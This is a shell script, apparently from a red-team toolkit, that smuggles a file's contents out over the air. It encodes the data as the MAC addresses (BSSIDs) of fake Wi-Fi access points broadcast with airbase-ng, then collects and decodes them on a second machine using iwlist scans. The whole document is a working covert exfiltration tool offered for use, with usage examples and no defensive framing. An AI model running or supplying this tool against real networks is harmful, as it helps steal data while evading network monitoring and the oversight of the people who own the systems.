 #!/bin/sh
echo
echo "NativePayload_BSSID.sh , Published by Damon Mohammadbagher 2017-2018" 
echo "Injecting/Downloading/Uploading DATA via BSSID (Wireless Traffic)"
echo "help syntax: ./NativePayload_BSSID.sh help"
echo
function killairbase
{

  sleep 10 ;
  echo
  killall airbase-ng ;

}
if [ $1 == "help" ]
then
tput setaf 2;
	echo
	echo "Example Step1: (Client Side ) ./NativePayload_BSSID.sh -f text-file Fake-AP-Name MonitorMode-Interface"
	echo "Example Step2: (Server Side ) ./NativePayload_BSSID.sh -s wlanx Exfil-Dump-file"
	echo "example System A : ./NativePayload_BSSID.sh -f mytext.txt myfakeAP Wlan3mon"
	echo "example System B : ./NativePayload_BSSID.sh -s wlan0 ExfilDumped.txt"
	echo "Description: with Step1 (system A) you will inject bytes for (mytext.txt) file to BSSID for Fake AP in this case (myfakeAP) , with Step2 on (system B) you can have this text file via Scanning Fake AP on AIR by Wireless traffic (Using iwlist tool)"
	echo "Note : before step1 you should make MonitorMode Interface (WlanXmon) by this command for example : airmon-ng start wlan3 "
	echo
	
fi

# ./NativePayload_BSSID.sh -f mytext.txt Fake wlan1mon0
# making fake mode
if [ $1 == "-f" ]
then
	for bytes in `xxd -p -c 5 $2 | sed 's/../&:/g'`; 
 	do
	   tput setaf 6;	
	   Exfil="${bytes::-1}"
	   text=`echo $Exfil | xxd -r -p`
	   Time=`date '+%d/%m/%Y %H:%M:%S'`	   	 
	   echo "[!] [$Time] #Injecting text: "\"$text\" "to Mac via BSSID" 00:$Exfil "for FAKE AccessPoint: " $3
	   sleep 0.3
	   tput setaf 9;	
	   # Making Fake AP via airbase and Injecting Payloads to BSSIDs (MAC Address)
	   killairbase | airbase-ng -a 00:$Exfil --essid $3 -I 10 -0 $4 | grep started	 

	 done
	 Time=`date '+%d/%m/%Y %H:%M:%S'`
	 tput setaf 6;
	 echo "[>] [$Time] Setting Finish Flag to BSSID..."
	 sleep 0.3
	 tput setaf 9;
	 killairbase | airbase-ng -a 00:ff:00:ff:00:ff --essid $3 -I 10 -0 $4 | grep started	 
fi

# ./NativePayload_BSSID.sh -s wlan0 myExfildump.txt
# starting scan mode
if [ $1 == "-s" ]
then
echo "Scanning Mode by \"Iwlist\" tool Started."
echo "" > $3
while true
 do
  # echo `iwlist 'wlan0' 'scan' | grep -e "Address: 00:"` >> $2 ;
  echo `iwlist $2 'scan' | grep -e "Address: 00:"` >> $3 ;
  tput setaf 9;	
  Time=`date '+%d/%m/%Y %H:%M:%S'`	 
  echo "[!] [$Time] iwlist AP list Dumped to file: " $3;
  sleep 6 ;
	FinishFlag=`cat $3 | grep -e 00:ff:00:ff:00:ff -e 00:FF:00:FF:00:FF`
	if (( `echo ${#FinishFlag}` !=0 ))
	then
	Time=`date '+%d/%m/%Y %H:%M:%S'`
	sleep 0.3
	tput setaf 7;	
	echo "[!] [$Time] Finish flag BSSID Address Detected :" 00:ff:00:ff:00:ff
	break
	fi
 done
 tput setaf 9;	
# fold -w37 $3 > output.txt ;
Time=`date '+%d/%m/%Y %H:%M:%S'`
echo "[>] [$Time] AP List saved to" \"temp.txt\" "file"
echo

# DEBUG
# cat output.txt
fold -w37 $3 > temp.txt;
 awk {'print $5'} temp.txt > temp2Awk.txt;
 # using '!a[$0]++' is not good idea ;) sometimes.... . 
  for ops in `awk '!a[$0]++' temp2Awk.txt | xxd -p`; 
	do
	ops1=`echo $ops | xxd -r -p`
	ops2=`echo $ops | xxd -r -p | xxd -r -p`
	echo $ops1 "==>" $ops2
	done
   echo
   echo "[!] your Injected Bytes via BSSID Addresses: "
   echo
   echo `awk '!a[$0]++' temp2Awk.txt`
   echo
   echo "[!] your Text/Data: "
   echo
   ExfilString=`cat temp2Awk.txt | awk '!a[$0]++'`
   echo "${ExfilString::-17}" | xxd -r -p
   Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
   echo " " > ExfilOutput_$Timestr.txt
   echo
   echo "[>] your Text/Data saved to" \"ExfilOutput_$Timestr.txt\" "file"
   str=`echo "${ExfilString::-17}" | xxd -r -p`
   echo $str > ExfilOutput_$Timestr.txt
fi
